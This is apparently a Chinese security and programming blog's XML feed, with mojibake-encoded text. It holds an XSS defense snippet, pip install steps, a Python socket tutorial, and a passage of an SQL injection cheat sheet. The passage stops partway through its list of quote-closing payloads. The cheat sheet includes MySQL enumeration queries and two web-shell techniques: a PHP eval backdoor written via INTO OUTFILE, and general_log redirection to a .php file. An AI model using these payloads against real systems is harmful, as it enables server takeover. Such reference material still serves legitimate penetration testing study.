æµ‹è¯•ç½‘ç«™çš„è¾“å…¥ç‚¹ã€‚</p><ul><li>DOMå‹ï¼šæ•°æ®=&gt;å®¢æˆ·ç«¯</li><li>åå°„å‹ï¼šæ•°æ®=&gt;æœåŠ¡å™¨=&gt;å®¢æˆ·ç«¯</li><li>å­˜å‚¨å‹ï¼šæ•°æ®=&gt;æœåŠ¡å™¨=&gt;æ•°æ®åº“=&gt;å®¢æˆ·ç«¯</li></ul><h1 id="2-é˜²å¾¡XSS"><a href="#2-é˜²å¾¡XSS" class="headerlink" title="2 é˜²å¾¡XSS"></a>2 é˜²å¾¡XSS</h1><p>XSS çš„ä¿®å¤åˆ†ä¸ºè¾“å…¥å’Œè¾“å‡ºä¸¤éƒ¨åˆ†ã€‚é€šè¿‡è¿‡æ»¤å°†è¾“å…¥çš„æ¶æ„ä»£ç æ‹¦æˆªåˆ°å¤–é¢ï¼ˆç±»ä¼¼ä¹˜é£æœºçš„å®‰æ£€ï¼‰ã€‚åœ¨è¾“å‡ºæ—¶ä¹Ÿå¿…é¡»è¦ç•™æ„ï¼Œå¦åˆ™è¿‡å»è¾“å…¥çš„æ¶æ„ä»£ç å¯èƒ½ä¹Ÿä¼šé€ æˆ XSSã€‚</p><ol><li>è¿‡æ»¤â€™ã€â€œã€&lt;ã€&gt;ã€on*ç­‰éæ³•å­—ç¬¦ã€‚</li><li>è¾“å‡ºçš„åˆ°é¡µé¢çš„æ•°æ®ï¼Œéœ€è¦è¿›è¡ŒHTMLå®ä½“ç¼–ç ã€Javascriptç¼–ç ã€‚</li></ol>]]></content>
    
    
    <categories>
      
      <category>å®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux Or Macå®‰è£…pip2 Or pip3</title>
    <link href="/2021/01/22/2021%E5%B9%B41%E6%9C%8822%E6%97%A5-Linux-Or-Mac%E5%AE%89%E8%A3%85pip2-Or-pip3/"/>
    <url>/2021/01/22/2021%E5%B9%B41%E6%9C%8822%E6%97%A5-Linux-Or-Mac%E5%AE%89%E8%A3%85pip2-Or-pip3/</url>
    
    <content type="html"><![CDATA[<p>ğŸ™ƒä¸ºä»€ä¹ˆ Kali çš„ Python ä¸è‡ªå¸¦ pipï¼Ÿä¸ºä»€ä¹ˆï¼Ÿä¸ºä»€ä¹ˆï¼Ÿ</p><h1 id="1-Python2"><a href="#1-Python2" class="headerlink" title="1 Python2"></a>1 Python2</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># ä¸‹è½½ä»£ç </span><br>wget https://bootstrap.pypa.io/2.6/get-pip.py<br><span class="hljs-comment"># python è¿›è¡Œå®‰è£…</span><br>python2 get-pip.py<br><span class="hljs-comment"># éªŒè¯æ˜¯å¦å®‰è£…æˆåŠŸ</span><br>pip -V<br><br></code></pre></td></tr></table></figure><h1 id="2-Python3"><a href="#2-Python3" class="headerlink" title="2 Python3"></a>2 Python3</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># ä¸‹è½½ä»£ç </span><br>wget https://bootstrap.pypa.io/get-pip.py<br><span class="hljs-comment"># python è¿›è¡Œå®‰è£…</span><br>python3 get-pip.py<br><span class="hljs-comment"># éªŒè¯æ˜¯å¦å®‰è£…æˆåŠŸ</span><br>pip -V<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ç¼–ç¨‹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Pythonç½‘ç»œç¼–ç¨‹ä¹‹socketç®€å•ä½¿ç”¨</title>
    <link href="/2021/01/22/2021%E5%B9%B41%E6%9C%8822%E6%97%A5-Python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E4%B9%8Bsocket%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"/>
    <url>/2021/01/22/2021%E5%B9%B41%E6%9C%8822%E6%97%A5-Python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E4%B9%8Bsocket%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="1-ç®€ä»‹"><a href="#1-ç®€ä»‹" class="headerlink" title="1 ç®€ä»‹"></a>1 ç®€ä»‹</h1><p>Python æä¾›ä¸¤ä¸ªçº§åˆ«çš„æœåŠ¡ï¼š</p><ol><li>Socketï¼ˆä½çº§åˆ«ï¼‰</li><li>SocketServerï¼ˆé«˜çº§åˆ«ï¼‰</li></ol><p>ä»€ä¹ˆæ˜¯ Socketï¼Ÿä¿—ç§°ã€Œå¥—æ¥å­—ã€ï¼Œå¯¹ TCP åè®®çš„æŠ½è±¡ï¼Œå¯ä»¥ç”¨äºä¸»æœºä¹‹é—´æˆ–è€…è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡ã€‚</p><p>é¦–å…ˆç”¨ä¸€ä¸ªç®€å•å®ä¾‹æ¥äº†è§£ socket åˆ›å»ºã€è¿æ¥ã€é€šä¿¡çš„åŸºæœ¬æ­¥éª¤ã€‚server ç«¯çš„åŸºæœ¬æ­¥éª¤ï¼š</p><ol><li>ç»‘å®š hostnameã€port</li><li>ä½¿ç”¨ accept æ–¹æ³•è¿›è¡Œç­‰å¾…</li><li>å°†æ¶ˆæ¯å‘é€ç»™ client ç«¯</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment"># å¼•å…¥æ¨¡å—</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br><br><span class="hljs-comment"># åˆ›å»ºsocketå¯¹è±¡ï¼Œå¥—æ¥å­—å®¶æ—é€‰ç”¨AF_INETï¼Œå¥—æ¥å­—ç±»å‹é€‰ç”¨é¢å‘è¿æ¥ã€‚</span><br>server_socket = socket.socket(<br>    family=socket.AF_INET,<br>    type=socket.SOCK_STREAM<br>)<br><br><br><span class="hljs-comment"># è·å–æœ¬æœºä¸»æœºå:MacBook-Pro.local</span><br>host = socket.gethostname()<br>port = <span class="hljs-number">9999</span><br><br><br><span class="hljs-comment"># ç»‘å®šç«¯å£å·</span><br>server_socket.bind((host, port))<br><br><br><span class="hljs-comment"># è®¾ç½®æœ€å¤§è¿æ¥æ•°ï¼Œè¶…è¿‡åæ’é˜Ÿ</span><br>server_socket.listen(<span class="hljs-number">5</span>)<br><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-comment"># å»ºç«‹å®¢æˆ·ç«¯è¿æ¥</span><br>    client_socket, addr = server_socket.accept()<br>    print(<span class="hljs-string">f&#x27;è¿æ¥åœ°å€ï¼š<span class="hljs-subst">&#123;addr&#125;</span>&#x27;</span>)<br><br><br>    message = <span class="hljs-string">&#x27;Hello world, socket!&#x27;</span><br>    client_socket.send(<br>        message.encode(<span class="hljs-string">&#x27;UTF-8&#x27;</span>)<br>    )<br>    client_socket.close()<br><br></code></pre></td></tr></table></figure><p>clientç«¯çš„åŸºæœ¬æ­¥éª¤ï¼š</p><ol><li>æŒ‡å®š hostnameã€port è¿æ¥åˆ°æœåŠ¡</li><li>æ¥å—æ¶ˆæ¯</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br><br><span class="hljs-comment"># åˆ›å»ºsocketå¯¹è±¡</span><br>s = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)<br><br><br><span class="hljs-comment"># è·å–æœ¬æœºåï¼Œè®¾ç½®ç«¯å£å·</span><br>hostname = socket.gethostname()<br>port = <span class="hljs-number">9999</span><br><br><br><span class="hljs-comment"># è¿æ¥åˆ°æœåŠ¡</span><br>s.connect(<br>    (hostname, port)<br>)<br><br><br><span class="hljs-comment"># æ¥å—æ¶ˆæ¯</span><br>message = s.recv(<span class="hljs-number">1024</span>)<br>print(message.decode(<span class="hljs-string">&#x27;UTF-8&#x27;</span>))<br><br></code></pre></td></tr></table></figure><h1 id="2-ç«¯å£"><a href="#2-ç«¯å£" class="headerlink" title="2 ç«¯å£"></a>2 ç«¯å£</h1><p>ä¸€ä¸ªå¥—æ¥å­—åªæ˜¯ç”¨æˆ·ç¨‹åºå’Œå†…æ ¸ä¿¡æ¯äº¤äº’çš„æ¢çº½ï¼Œä»–è‡ªèº«æ²¡æœ‰å¤ªå¤šä¿¡æ¯ï¼Œä¹Ÿæ²¡æœ‰ç½‘ç»œåè®®å’Œç«¯å£å·ã€‚åœ¨è¿›è¡Œç½‘ç»œé€šä¿¡æ—¶ï¼Œå¿…é¡»æŠŠä¸€ä¸ªå¥—æ¥å­—å’Œä¸€ä¸ªåœ°å€ç›¸å…³è”ï¼Œè¿™ä¸ªè¿‡ç¨‹å°±æ˜¯åœ°å€ç»‘å®šçš„è¿‡ç¨‹ã€‚</p><p>è®¸å¤šæ—¶å€™å†…æ ¸ä¼šè‡ªåŠ¨ç»‘å®šä¸€ä¸ªåœ°å€ï¼Œç„¶è€Œå¾ˆå¤šæ—¶å€™ä¸ºäº†æ–¹ä¾¿è®°å¿†å’Œç®¡ç†ï¼Œéƒ½ä¼šè¿›è¡Œæ‰‹åŠ¨ç»‘å®šã€‚æœ€å…¸å‹çš„æƒ…å†µå°±æ˜¯æœåŠ¡å™¨è¿›ç¨‹ç»‘å®šä¸€ä¸ªç«¯å£ï¼Œç­‰å¾…å…¶ä»–çš„è¿›ç¨‹è¿›è¡Œè¿æ¥ã€‚</p><p>ä¸‹é¢è¿›è¡Œç®€å•çš„éªŒè¯ï¼Œserverç«¯çš„ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment"># å¼•å…¥æ¨¡å—</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br><br><span class="hljs-comment"># åˆ›å»ºsocketå¯¹è±¡ï¼Œå¥—æ¥å­—å®¶æ—é€‰ç”¨AF_INETï¼Œå¥—æ¥å­—ç±»å‹é€‰ç”¨é¢å‘è¿æ¥ã€‚</span><br>server_socket = socket.socket(<br>    family=socket.AF_INET,<br>    type=socket.SOCK_STREAM<br>)<br><br><br><span class="hljs-comment"># è·å–æœ¬æœºä¸»æœºå:MacBook-Pro.local</span><br>host = socket.gethostname()<br>port = <span class="hljs-number">9999</span><br><br><br><span class="hljs-comment"># ç»‘å®šç«¯å£å·</span><br>server_socket.bind((host, port))<br><br><br><span class="hljs-comment"># è®¾ç½®æœ€å¤§è¿æ¥æ•°ï¼Œè¶…è¿‡åæ’é˜Ÿ</span><br>server_socket.listen(<span class="hljs-number">5</span>)<br><br><br>count = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-comment"># å»ºç«‹å®¢æˆ·ç«¯è¿æ¥</span><br>    client_socket, addr = server_socket.accept()<br>    count += <span class="hljs-number">1</span><br>    print(<span class="hljs-string">f&#x27;è¿æ¥åœ°å€ï¼š<span class="hljs-subst">&#123;addr&#125;</span>&#x27;</span>)<br>    print(count)<br><br><br>    message = <span class="hljs-string">&#x27;Hello world, socket!&#x27;</span><br>    client_socket.send(<br>        message.encode(<span class="hljs-string">&#x27;UTF-8&#x27;</span>)<br>    )<br>    client_socket.close()<br><br></code></pre></td></tr></table></figure><p>æ¯æ¬¡è¿æ¥ä¹‹åéƒ½ä¼šè¾“å‡ºå¯¹æ–¹çš„ IP å’Œç«¯å£ï¼Œè¿™æ ·å°±èƒ½æ¯”è¾ƒæ¸…æ™°çš„è§‚å¯Ÿç«¯å£çš„å˜åŒ–ã€‚</p><p>clientç«¯ï¼ˆæœªç»‘å®šå›ºå®šçš„ç«¯å£ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br><br><span class="hljs-comment"># åˆ›å»ºsocketå¯¹è±¡</span><br>s = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)<br><br><br><span class="hljs-comment"># è·å–æœ¬æœºåï¼Œè®¾ç½®ç«¯å£å·</span><br>hostname = socket.gethostname()<br>port = <span class="hljs-number">9999</span><br><br><br><span class="hljs-comment"># è¿æ¥åˆ°æœåŠ¡</span><br>s.connect(<br>    (hostname, port)<br>)<br><br><br><span class="hljs-comment"># æ¥å—æ¶ˆæ¯</span><br>message = s.recv(<span class="hljs-number">1024</span>)<br>print(message.decode(<span class="hljs-string">&#x27;UTF-8&#x27;</span>))<br><br></code></pre></td></tr></table></figure><p>é¦–å…ˆå¯åŠ¨serverç«¯ï¼Œç„¶åå¯åŠ¨clientç«¯ï¼Œå°±å¯ä»¥çœ‹åˆ°clientç«¯å›æ˜¾ä¸‹é¢çš„å­—æ¯ï¼šHello world, socket!</p><p>å¤šæ¬¡è¿è¡Œä¹‹åå°±èƒ½æ¸…æ¥šçš„å‘ç°client.pyçš„ç«¯å£åœ¨å‘ç”Ÿå˜åŒ–ï¼Œè¯´æ˜å…¶ç«¯å£æ˜¯ç”±ç³»ç»Ÿè‡ªåŠ¨åˆ†é…çš„ã€‚<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/BB0A8DF5-6EBA-4ED7-88C8-6F69100864CC.png"></p><p>å¯ä»¥è€ƒè™‘æ‰‹åŠ¨ç»‘å®šç«¯å£ï¼Œè®©ipçš„ç«¯å£å›ºå®šä¸ºè‡ªå·±æƒ³è¦çš„ç«¯å£ï¼Œåœ¨ connect ä¹‹å‰æ‰§è¡Œå¦‚ä¸‹ä»£ç å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><br>s.bind(<br>    (hostname, <span class="hljs-number">59446</span>)<br>)<br><br></code></pre></td></tr></table></figure><p>æœ€åä»£ç ä¸ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br><br><span class="hljs-comment"># åˆ›å»ºsocketå¯¹è±¡</span><br>s = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)<br><br><br><span class="hljs-comment"># è·å–æœ¬æœºåï¼Œè®¾ç½®ç«¯å£å·</span><br>hostname = socket.gethostname()<br>port = <span class="hljs-number">9999</span><br><br><br><span class="hljs-comment"># è¿æ¥åˆ°æœåŠ¡</span><br>s.bind(<br>    (hostname, <span class="hljs-number">59446</span>)<br>)<br>s.connect(<br>    (hostname, port)<br>)<br><br><br><span class="hljs-comment"># æ¥å—æ¶ˆæ¯</span><br>message = s.recv(<span class="hljs-number">1024</span>)<br>print(message.decode(<span class="hljs-string">&#x27;UTF-8&#x27;</span>))<br><br></code></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°è‡ªå·±æ‰‹åŠ¨ç»‘å®šç«¯å£ä¹‹åï¼Œç«¯å£å›ºå®šä¸å˜<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/124FE048-BAFF-46AE-ABD2-4B3181C54DFF.png"></p><p>ç»“æœæ­£å¦‚ä¸Šæ–‡æ‰€è¯´ï¼Œå¦‚æœä¸ç»‘å®šç«¯å£ï¼Œç³»ç»Ÿåˆ™ä¼šè‡ªåŠ¨åˆ†é…ç«¯å£ã€‚</p><h1 id="é™„å½•"><a href="#é™„å½•" class="headerlink" title="é™„å½•"></a>é™„å½•</h1><p>å‚è€ƒæ•™ç¨‹ï¼š</p><ol><li>Python3 ç½‘ç»œç¼–ç¨‹ï¼š<a href="https://www.runoob.com/python3/python3-socket.html">https://www.runoob.com/python3/python3-socket.html</a></li><li>ç½‘ç»œç¼–ç¨‹socketä¹‹bindå‡½æ•°ï¼š<a href="https://blog.csdn.net/dongliqiang2006/article/details/5824651">https://blog.csdn.net/dongliqiang2006/article/details/5824651</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>ç¼–ç¨‹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>socket</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlæ³¨å…¥é€ŸæŸ¥æ‰‹å†Œï¼ˆä¸å®šæœŸæ›´æ–°ï¼‰</title>
    <link href="/2021/01/18/2021%E5%B9%B41%E6%9C%8818%E6%97%A5-sql%E6%B3%A8%E5%85%A5%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C%EF%BC%88%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
    <url>/2021/01/18/2021%E5%B9%B41%E6%9C%8818%E6%97%A5-sql%E6%B3%A8%E5%85%A5%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C%EF%BC%88%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="1-åˆ©ç”¨æ–¹å¼"><a href="#1-åˆ©ç”¨æ–¹å¼" class="headerlink" title="1 åˆ©ç”¨æ–¹å¼"></a>1 åˆ©ç”¨æ–¹å¼</h1><h2 id="1-1-å›æ˜¾æ•°æ®"><a href="#1-1-å›æ˜¾æ•°æ®" class="headerlink" title="1.1 å›æ˜¾æ•°æ®"></a>1.1 å›æ˜¾æ•°æ®</h2><ul><li>ç³»ç»Ÿä¿¡æ¯æ”¶é›†ï¼šå¸¸è§çš„ä½¿ç”¨ <code>*</code> è¿›è¡Œæ ‡æ³¨<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><br><span class="hljs-function"><span class="hljs-title">system_user</span><span class="hljs-params">()</span></span>     ç³»ç»Ÿç”¨æˆ·å<br><span class="hljs-function"><span class="hljs-title">user</span><span class="hljs-params">()</span></span>            MYSQLç”¨æˆ·å <br><span class="hljs-function"><span class="hljs-title">current_user</span><span class="hljs-params">()</span></span>    å½“å‰ç”¨æˆ·å<br><span class="hljs-function"><span class="hljs-title">session_user</span><span class="hljs-params">()</span></span>    è¿æ¥æ•°æ®åº“çš„ç”¨æˆ·å<br><span class="hljs-function"><span class="hljs-title">database</span><span class="hljs-params">()</span></span>        å½“å‰æ•°æ®åº“åï¼ˆ*ï¼‰<br><span class="hljs-function"><span class="hljs-title">schema</span><span class="hljs-params">()</span></span>          å½“å‰æ•°æ®åº“å<br><span class="hljs-function"><span class="hljs-title">version</span><span class="hljs-params">()</span></span>         å½“å‰æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯<br>@@version         æ•°æ®åº“ç‰ˆæœ¬<br><span class="hljs-function"><span class="hljs-title">load_file</span><span class="hljs-params">()</span></span>       MYSQLè¯»å–æœ¬åœ°æ–‡ä»¶ï¼ˆ*ï¼‰<br><br>@@datadir         Location of DB files<br>@@hostname        æœåŠ¡å™¨ä¸»æœºå<br>@@basedir         MYSQL å®‰è£…è·¯å¾„<br>@@version_compile_os    æ“ä½œç³»ç»Ÿ<br><br></code></pre></td></tr></table></figure></li><li>æ•°æ®åº“ä¿¡æ¯æ”¶é›†<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-comment">-- æŸ¥çœ‹æ•°æ®åº“æœåŠ¡å™¨ä¸Šçš„æ•°æ®åº“</span><br><span class="hljs-keyword">SELECT</span> SCHEMA_NAME <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.SCHEMATA<br><br><span class="hljs-comment">-- æŸ¥çœ‹æŸä¸ªæ•°æ®åº“é‡Œé¢çš„æ•°æ®è¡¨</span><br><span class="hljs-keyword">SELECT</span> table_name <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.TABLES <span class="hljs-keyword">WHERE</span> table_schema =<span class="hljs-string">&#x27;æ•°æ®åº“å&#x27;</span><br><br><span class="hljs-comment">-- æŸ¥çœ‹æŸä¸ªæ•°æ®è¡¨é‡Œé¢çš„å­—æ®µ</span><br><span class="hljs-comment">--   é»˜è®¤å½“å‰æ•°æ®åº“</span><br><span class="hljs-keyword">SELECT</span> COLUMN_NAME <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.COLUMNS <span class="hljs-keyword">WHERE</span> table_name =<span class="hljs-string">&#x27;è¡¨å&#x27;</span><br><span class="hljs-comment">--  æŒ‡å®šæ•°æ®åº“</span><br><span class="hljs-keyword">SELECT</span> COLUMN_NAME <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.COLUMNS <span class="hljs-keyword">WHERE</span> table_name =<span class="hljs-string">&#x27;è¡¨å&#x27;</span> <span class="hljs-keyword">AND</span> table_schema =<span class="hljs-string">&#x27;æ•°æ®åº“å&#x27;</span><br><br><span class="hljs-comment">-- æŸ¥æ‰¾å­—æ®µåä¸ºidçš„æ•°æ®åº“åå’Œè¡¨å</span><br><span class="hljs-keyword">SELECT</span> table_schema, table_name <span class="hljs-keyword">FROM</span> information_schema.columns <span class="hljs-keyword">WHERE</span> column_name = <span class="hljs-string">&#x27;id&#x27;</span>;<br><br><span class="hljs-comment">-- æƒé™åˆ—è¡¨</span><br><span class="hljs-keyword">SELECT</span> grantee, privilege_type, is_grantable <span class="hljs-keyword">FROM</span> information_schema.user_privileges;<br><br></code></pre></td></tr></table></figure></li></ul><h2 id="1-2-Getshell"><a href="#1-2-Getshell" class="headerlink" title="1.2 Getshell"></a>1.2 Getshell</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-comment">-- outfileè·å–shellï¼ˆunionï¼‰</span><br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;pwd&quot;]) ?&gt;&#x27;</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">outfile</span> <span class="hljs-string">&#x27;å¯è®¿é—®webè·¯å¾„&#x27;</span><br><br><span class="hljs-comment">-- å¼€å¯æ—¥å¿—è·å–shellï¼ˆå †å ï¼‰</span><br><span class="hljs-comment">-- æŸ¥çœ‹é…ç½®</span><br><span class="hljs-keyword">show</span> <span class="hljs-keyword">variables</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;general%&#x27;</span>;<br><span class="hljs-comment">-- å¼€å¯æ—¥å¿—</span><br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log = <span class="hljs-string">&quot;ON&quot;</span>;<br><span class="hljs-comment">-- è®¾ç½®è·¯å¾„</span><br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log_file=<span class="hljs-string">&#x27;/Users/littlechieh6/Documents/project/sqli-labs-php7/shell.php&#x27;</span>;<br><span class="hljs-comment">-- æ•°æ®å†™å…¥</span><br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>;<br><br></code></pre></td></tr></table></figure><h1 id="2-é—­åˆæ–¹å¼"><a href="#2-é—­åˆæ–¹å¼" class="headerlink" title="2 é—­åˆæ–¹å¼"></a>2 é—­åˆæ–¹å¼</h1><h2 id="2-1-å¸¸è§ç±»å‹"><a href="#2-1-å¸¸è§ç±»å‹" class="headerlink" title="2.1 å¸¸è§ç±»å‹"></a>2.1 å¸¸è§ç±»å‹</h2><p>æ•°å­—ã€å­—ç¬¦ã€æ‹¬å·å‹ï¼ˆå•ä¾§ï¼‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell"><br>)<br>))<br>&#x27;<br>&#x27;)<br>&#x27;))<br>&quot;<br>&quot;)<br>&quot;))<br>`<br>`)<br>`))<br><span class="hljs-meta">%</span><br><span class="hljs-meta">%</span><span class="bash">)</span><br><span class="hljs-meta">%</span><span class="bash"><span class="hljs-string">&#x27;</span></span><br><span class="hljs-meta">%</span><span class="bash"><span class="hljs-string">&#x27;)</span></span><br><span class="hljs-meta">%</span><span class="bash"><span class="hljs-string">&#x27;))</span></span><br><span 